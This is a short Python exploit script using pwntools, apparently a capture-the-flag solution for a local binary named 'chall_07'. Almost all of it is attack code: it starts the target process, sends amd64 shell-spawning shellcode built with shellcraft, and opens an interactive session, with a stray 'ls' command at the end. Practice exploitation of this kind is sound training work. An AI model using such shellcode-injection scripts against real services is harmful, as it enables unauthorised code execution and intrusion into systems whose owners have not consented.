from pwn import *
p = process ("./chall_07")
context.arch = "amd64" 
elf = ELF("./chall_07") 

# resp = p.recv()
# resp

p.sendline()

payload = b''
shellcode = asm(shellcraft.amd64.sh())
payload+= shellcode

p.sendline(payload)

p.interactive()
ls